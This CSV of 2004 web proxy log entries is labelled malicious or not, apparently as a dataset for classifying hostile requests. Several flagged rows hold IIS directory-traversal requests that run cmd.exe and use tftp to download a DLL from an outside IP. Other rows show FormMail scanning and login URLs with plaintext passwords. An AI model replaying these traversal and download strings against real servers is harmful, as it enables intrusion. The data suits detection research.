,ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,class,malicious,url_sem_query,qtd_query_params,navegador
5995,212.160.136.163,10/Mar/2004:10:03:47 -0500,http://www.searchyourpockets.com/xml/?&aff_id=1546&str=children ,200,566,"""http://www.bodybuilding.powerlifter.ifbbpro.net/""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/xml/,2,Microsoft Internet Explorer
5996,67.83.151.132,10/Mar/2004:10:03:59 -0500,http://www.datasync.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
5997,68.82.168.149,10/Mar/2004:10:04:02 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.6 ( compatible; MSIE 4.0; Windows NT4.0; NetCaptor ),n,0,/members/index.htm,0,Microsoft Internet Explorer
5998,212.160.136.163,10/Mar/2004:10:04:19 -0500,http://searchezprovider.com/search.php?ID=321&fString=sport ,300,0,"""http://www.entresgroup.ifbbpro.net/""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/search.php,2,Microsoft Internet Explorer
5999,212.160.136.163,10/Mar/2004:10:04:25 -0500,http://searchezprovider.com/search_results.php?fSearch_id=708036d248fa68f0&fString=sport ,200,14157,"""http://www.entresgroup.ifbbpro.net/""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/search_results.php,2,Microsoft Internet Explorer
6000,68.0.178.69,10/Mar/2004:10:04:27 -0500,http://www.sina.com.cn/ ,200,12717,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/,0,Microsoft Internet Explorer
6001,212.160.136.163,10/Mar/2004:10:04:28 -0500,http://searchezprovider.com/redirect.php?fID=49250446 ,300,0,"""http://searchezprovider.com/search_results.php?fSearch_id=708036d248fa68f0&fString=sport""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/redirect.php,1,Microsoft Internet Explorer
6002,212.160.136.163,10/Mar/2004:10:04:30 -0500,http://www.blowsearch.com/r.php?mc=25614=oAAADwQDQcwerLUTtZaxM=uAAAUnRIIQMyx2DnmRcAo65RaUNKFAMJBtdnUrXxuZakLRdywwlGYEAnBki3C1uOQLwA4rQhTzQeDJfDGZLxSlT3fxUDwWymphqTnRLpvggtvCyl4oS6W4EwQdlrqptQG4Ob1VplmJZ4xq4TBRxAOIiUSQauIxjsJLUPOKzaBuMweokLImGpbSdXjilxVdYJBySCU6EAK25RykDgLEKESveNUa5BbfLpdxSQikVWjiytPcGRsWhqc=2r?p/zbpDDDnuOOOunDDDp//CCCcgguCCCCCCMMM112CCCCCC011DDD1CCCCCCgebcfCCCCCC3612409812OOO5728418308OOO132DDD45DDD18DDD77CCCCCC3675409812CCCCCC012DDD712DDD95DDD97CCCCCCsnpvivCCCCCC]nUOOOuN[CCCCCC5728418308&v=c6d923cf3f5b78b7e337ff47e9ae477f ,300,2,"""http://searchezprovider.com/search_results.php?fSearch_id=708036d248fa68f0&fString=sport""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),m,1,/r.php,2,Microsoft Internet Explorer
6003,68.48.7.157,10/Mar/2004:10:04:30 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
6004,68.48.36.59,10/Mar/2004:10:04:33 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
6005,212.160.136.163,10/Mar/2004:10:04:36 -0500,http://c.ah-ha.com/c?e1=pduJfETpCglvwJIxvDFkqcYsoO4nHAriFRXRYtQxlE41XNR5HPFlOWLqIkyvwKqFocTzVYxbrjZhOnmXBCHYWfwkVhnDFHvVBNkEOG3dk3MWzycI0oB3TDgcdeyqDjR3J5Fb3ylPigtticYEaGduczlJjQHks2GyFkYMTQsWQrDmGuDe3NjYDBh0P2vxOaNRLTyjjlqEYxnMhkKeHaqgOWZNSXAHnE45bNpEzaQ1klZDVVEaH&h=ZknMgGHYerjpDQDjQ&b=30541 ,300,0,"""http://searchezprovider.com/search_results.php?fSearch_id=708036d248fa68f0&fString=sport""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/c,3,Microsoft Internet Explorer
6006,212.160.136.163,10/Mar/2004:10:04:38 -0500,http://c.ah-ha.com/c/2?e1=pduJfETpCglvwJIxvDFkqcYsoO4nHAriFRXRYtQxlE41XNR5HPFlOWLqIkyvwKqFocTzVYxbrjZhOnmXBCHYWfwkVhnDFHvVBNkEOG3dk3MWzycI0oB3TDgcdeyqDjR3J5Fb3ylPigtticYEaGduczlJjQHks2GyFkYMTQsWQrDmGuDe3NjYDBh0P2vxOaNRLTyjjlqEYxnMhkKeHaqgOWZNSXAHnE45bNpEzaQ1klZDVVEaH&h=ZknMgGHYerjpDQDjQ&b=30541 ,300,0,"""http://searchezprovider.com/search_results.php?fSearch_id=708036d248fa68f0&fString=sport""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/c/2,3,Microsoft Internet Explorer
6007,68.82.168.149,10/Mar/2004:10:04:40 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.0 ( compatible; [jp]; Windows 98; NetCaptor ),n,0,/members/index.htm,0,without browser
6008,208.190.202.194,10/Mar/2004:10:04:40 -0500,http://l11.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=logo_&passwd=bmx ,200,566,"""-""",-,n,0,/config/login,8,without browser
6009,192.117.242.67,10/Mar/2004:10:04:49 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
6010,192.117.242.67,10/Mar/2004:10:04:50 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
6011,212.160.136.163,10/Mar/2004:10:05:03 -0500,http://www.apollonsports.com/ ,200,45638,"""http://searchezprovider.com/search_results.php?fSearch_id=708036d248fa68f0&fString=sport""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/,0,Microsoft Internet Explorer
6012,68.82.168.149,10/Mar/2004:10:05:13 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.6 ( compatible; [fr]; Windows NT4.0; Compaq ),n,0,/members/index.htm,0,without browser
6013,68.48.7.157,10/Mar/2004:10:05:20 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
6014,68.48.7.157,10/Mar/2004:10:05:20 -0500,/d/httpodbc.dll ,400,282,"""-""",-,m,1,/d/httpodbc.dll,0,without browser
6015,68.48.36.59,10/Mar/2004:10:05:24 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
6016,67.83.151.132,10/Mar/2004:10:05:24 -0500,http://www.swedishweaving.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6017,68.82.168.149,10/Mar/2004:10:05:28 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.6 ( compatible; [en]; Windows 98; athome020 ),n,0,/members/index.htm,0,without browser
6018,68.82.168.149,10/Mar/2004:10:05:30 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.0 ( compatible; [jp]; Windows 98; NetCaptor ),n,0,/members/index.htm,0,without browser
6019,67.83.151.132,10/Mar/2004:10:05:31 -0500,http://www.ooe-rodelverband.at/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6020,208.190.202.194,10/Mar/2004:10:05:42 -0500,http://l12.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=lanceb_&passwd=bmx ,200,566,"""-""",-,n,0,/config/login,8,without browser
6021,68.82.168.149,10/Mar/2004:10:05:45 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.6 ( compatible; MSIE 4.0; Windows NT5.0; win9x/NT 4.90 ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6022,68.82.168.149,10/Mar/2004:10:06:03 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.6 ( compatible; [fr]; Windows NT4.0; Compaq ),n,0,/members/index.htm,0,without browser
6023,68.48.7.157,10/Mar/2004:10:06:10 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
6024,68.48.36.59,10/Mar/2004:10:06:14 -0500,/scripts/..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../httpodbc.dll,0,without browser
6025,68.82.168.149,10/Mar/2004:10:06:18 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.6 ( compatible; [en]; Windows 98; athome020 ),n,0,/members/index.htm,0,without browser
6026,67.83.151.132,10/Mar/2004:10:06:20 -0500,http://www.wmcclure.co.uk/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
6027,67.83.151.132,10/Mar/2004:10:06:32 -0500,http://www.thecrownandcushion.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
6028,67.83.151.132,10/Mar/2004:10:06:32 -0500,http://home.gci.net/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6029,192.117.242.67,10/Mar/2004:10:06:40 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
6030,67.83.151.132,10/Mar/2004:10:06:43 -0500,http://www.atimemedia.com/cgi-bin/mail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/mail.pl,0,Microsoft Internet Explorer
6031,208.190.202.194,10/Mar/2004:10:06:47 -0500,http://l12.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=leoj__&passwd=bmx ,200,566,"""-""",-,n,0,/config/login,8,without browser
6032,67.83.151.132,10/Mar/2004:10:06:53 -0500,http://www.math.luc.edu/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6033,68.105.26.80,10/Mar/2004:10:06:55 -0500,http://edit.vip.tpe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=kittens_wildman_wings&passwd=poop ,200,566,"""-""",-,n,0,/config/login,8,without browser
6034,68.82.168.149,10/Mar/2004:10:06:56 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.6 ( compatible; MSIE 5.5; Windows 95; win9x/NT 4.90 ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6035,68.48.7.157,10/Mar/2004:10:07:00 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
6036,68.48.36.59,10/Mar/2004:10:07:04 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
6037,68.82.168.149,10/Mar/2004:10:07:05 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/5.0 ( compatible; [fr]; Windows NT5.0; MSNIA ),n,0,/members/index.htm,0,without browser
6038,67.83.151.132,10/Mar/2004:10:07:18 -0500,http://www.darkbasiccodebase.co.uk/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
6039,68.82.168.149,10/Mar/2004:10:07:29 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.0 ( compatible; [fr]; Windows 95; DigiExt ),n,0,/members/index.htm,0,without browser
6040,208.190.202.194,10/Mar/2004:10:07:50 -0500,http://edit.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=loyd_&passwd=bmx ,200,566,"""-""",-,n,0,/config/login,8,without browser
6041,68.48.7.157,10/Mar/2004:10:07:51 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
6042,68.48.36.59,10/Mar/2004:10:07:54 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
6043,67.83.151.132,10/Mar/2004:10:07:54 -0500,http://mark.asci.ncsu.edu/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6044,192.117.242.67,10/Mar/2004:10:07:57 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
6045,192.117.242.67,10/Mar/2004:10:07:57 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
6046,217.132.70.161,10/Mar/2004:10:08:00 -0500,http://www.sun.com/ ,200,0,"""-""",Mozilla/4.0 (compatible; ICS),n,0,/,0,without browser
6047,203.121.182.141,10/Mar/2004:10:08:07 -0500,207.137.186.92:25 ,500,434,"""-""",-,n,0,207.137.186.92:25,0,without browser
6048,24.168.72.174,10/Mar/2004:10:08:12 -0500,http://edit.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus_pat&passwd=priest ,200,566,"""-""",-,n,0,/config/login,8,without browser
6049,68.82.168.149,10/Mar/2004:10:08:19 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.0 ( compatible; [fr]; Windows 95; DigiExt ),n,0,/members/index.htm,0,without browser
6050,216.120.240.254,10/Mar/2004:10:08:40 -0500,http://www.google.com/ ,200,3735,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),n,0,/,0,Microsoft Internet Explorer
6051,68.82.168.149,10/Mar/2004:10:08:40 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.6 ( compatible; MSIE 5.5; Windows 95; win9x/NT 4.90 ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6052,68.82.168.149,10/Mar/2004:10:08:40 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.0 ( compatible; MSIE 5.0; Windows NT4.0; DigiExt ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6053,68.48.7.157,10/Mar/2004:10:08:41 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
6054,68.48.36.59,10/Mar/2004:10:08:44 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
6055,220.185.158.29,10/Mar/2004:10:08:46 -0500,http://www.searchcharm.com/ppc_dir_new/?aff_id=5&str=College ,200,1340,"""http://www.homemoneyplan.com/""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/ppc_dir_new/,2,Microsoft Internet Explorer
6056,67.83.151.132,10/Mar/2004:10:08:47 -0500,http://www.badminton-interactive.com/cgi-bin/Form.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/Form.pl,0,Microsoft Internet Explorer
6057,68.82.168.149,10/Mar/2004:10:08:50 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.73 ( compatible; MSIE 4.01; Windows 98; DigiExt ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6058,208.190.202.194,10/Mar/2004:10:09:09 -0500,http://sbc1.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=mje___&passwd=bmx ,200,566,"""-""",-,n,0,/config/login,8,without browser
6059,64.237.56.233,10/Mar/2004:10:09:10 -0500,http://niksoftware.ru/proxycheck.pl?proxyhost=192.168.1.103&proxyport=8000&proxyprotocol=HTTP ,200,215,"""-""",-,n,0,/proxycheck.pl,3,without browser
6060,61.172.244.216,10/Mar/2004:10:09:12 -0500,140.125.90.203:25 ,500,434,"""-""",-,n,0,140.125.90.203:25,0,without browser
6061,68.82.168.149,10/Mar/2004:10:09:16 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.73 ( compatible; MSIE 4.01; Windows XP; win9x/NT 4.90 ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6062,65.40.141.230,10/Mar/2004:10:09:20 -0500,http://65.40.141.230/members/sex/fuck/id000013id/lund5994lundxxx.html ,400,0,"""-""",-,n,0,/members/sex/fuck/id000013id/lund5994lundxxx.html,0,without browser
6063,65.40.141.230,10/Mar/2004:10:09:21 -0500,65.40.141.230:80 ,200,0,"""-""",-,n,0,65.40.141.230:80,0,without browser
6064,68.48.7.157,10/Mar/2004:10:09:34 -0500,/scripts/..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../httpodbc.dll,0,without browser
6065,68.48.36.59,10/Mar/2004:10:09:35 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
6066,192.117.242.67,10/Mar/2004:10:09:52 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
6067,68.82.168.149,10/Mar/2004:10:09:53 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.0 ( compatible; MSIE 5.0; Windows 98; DigiExt ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6068,67.83.151.132,10/Mar/2004:10:09:53 -0500,http://www.openoceansurfing.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6069,67.83.151.132,10/Mar/2004:10:10:04 -0500,http://www.eng.tau.ac.il/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6070,68.82.168.149,10/Mar/2004:10:10:06 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.73 ( compatible; MSIE 4.01; Windows XP; win9x/NT 4.90 ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6071,68.0.178.69,10/Mar/2004:10:10:12 -0500,http://www.sina.com.cn/ ,200,8373,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/,0,Microsoft Internet Explorer
6072,208.190.202.194,10/Mar/2004:10:10:16 -0500,http://sbc1.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=lizzieb_&passwd=bmx ,200,566,"""-""",-,n,0,/config/login,8,without browser
6073,68.48.7.157,10/Mar/2004:10:10:24 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
6074,217.132.70.161,10/Mar/2004:10:10:24 -0500,http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi ,200,2035,"""-""",Mozilla/4.0 (compatible; ICS),n,0,/trino/ProxyJ/prxjdg.cgi,0,without browser
6075,68.82.168.149,10/Mar/2004:10:10:26 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.7 ( compatible; [de]; Windows 95; athome020 ),n,0,/members/index.htm,0,without browser
6076,67.83.151.132,10/Mar/2004:10:10:26 -0500,http://www.math.luc.edu/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6077,68.48.36.59,10/Mar/2004:10:10:28 -0500,/_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll,0,without browser
6078,68.82.168.149,10/Mar/2004:10:10:32 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.73 ( compatible; [fr]; Windows NT5.0; DigiExt ),n,0,/members/index.htm,0,without browser
6079,68.82.168.149,10/Mar/2004:10:10:43 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.0 ( compatible; MSIE 5.0; Windows 98; DigiExt ),n,0,/members/index.htm,0,Microsoft Internet Explorer
6080,68.82.168.149,10/Mar/2004:10:11:02 -0500,http://www.proteen.com/members/index.htm ,200,566,"""http://www.proteen.com/members/index.htm""",Mozilla/4.7 ( compatible; [dk]; Windows NT5.0; Compaq ),n,0,/members/index.htm,0,without browser
6081,68.48.7.157,10/Mar/2004:10:11:14 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
6082,67.83.151.132,10/Mar/2004:10:11:18 -0500,http://www.filipina-brides.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
6083,67.83.151.132,10/Mar/2004:10:11:21 -0500,http://www.shilog.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6084,208.190.202.194,10/Mar/2004:10:11:23 -0500,http://sbc2.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=mmg_&passwd=bmx ,200,566,"""-""",-,n,0,/config/login,8,without browser
6085,192.117.242.67,10/Mar/2004:10:11:30 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
6086,192.117.242.67,10/Mar/2004:10:11:30 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
6087,67.83.151.132,10/Mar/2004:10:11:54 -0500,http://www.miramarevents.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
6088,68.48.36.59,10/Mar/2004:10:12:03 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
6089,68.48.36.59,10/Mar/2004:10:12:03 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
